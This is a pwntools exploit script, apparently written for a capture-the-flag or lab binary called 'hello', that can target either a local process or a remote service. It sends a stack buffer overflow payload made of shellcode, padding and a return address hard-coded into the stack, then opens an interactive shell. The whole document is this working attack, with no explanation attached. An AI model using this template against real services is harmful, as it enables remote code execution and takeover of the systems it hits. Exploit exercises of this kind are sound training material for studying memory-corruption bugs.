from pwn import *

local = True
context.binary = "./hello"

if local:
	r = process("./hello")
else:
    r = remote("100.101.159.45", 5003)
    

s = r.recvuntil("What’s your name?")

#address_str = r.recvline().strip()
#address = int(address_str, 16)

#n = 0x6c + 0x4

GDB_OFFSET = 0xf0

#[rbp-0x80]
CHAR_ARRAY_SIZE = 0x80
string_address = 0x7fffffffc7b0 - CHAR_ARRAY_SIZE + GDB_OFFSET

#log.info(address_str)
bindshell = asm(shellcraft.sh())


n = CHAR_ARRAY_SIZE + 0x08

total = n - len(bindshell)

payload = bindshell + b'A'*total + p64(string_address)

log.info(f"Payload is {payload}")


r.sendline(payload)

log.info("Payload sent")

r.interactive()